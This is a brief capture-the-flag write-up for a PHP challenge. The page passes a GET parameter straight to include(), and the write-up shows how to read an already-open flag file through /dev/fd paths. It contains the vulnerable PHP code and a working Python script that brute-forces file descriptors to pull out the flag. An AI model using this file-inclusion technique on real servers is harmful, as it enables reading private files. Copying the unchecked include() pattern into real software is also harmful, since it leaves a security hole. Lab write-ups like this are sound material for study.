```
<?php
  $fp = fopen("/tmp/flag.txt", "r");
  if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['include']) && strlen($_GET['include']) <= 10) {
    include($_GET['include']);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?>
```

php subroutine process directory:

/dev/fd

so brute force attack is available maybe

/?include=/dev/fd/1
/?include=/dev/fd/2
/?include=/dev/fd/3
..........

create exploit:

```
#!/usr/bin/python3

import sys
import requests
import re

if len(sys.argv) != 2:
  print("[!]Require URL to Attack...")
  sys.exit()

url = sys.argv[1]

parameter = "?include=/dev/fd/"

for i in range(0,11):
    req_url = url + parameter + str(i)
    res = requests.get(req_url)
    print(f"count: {str(i)}")

    if "247CTF" in res.text:
        reg = re.search(r"247CTF.+",res.text)
        print(res.text)
        print(reg.group())
        
```






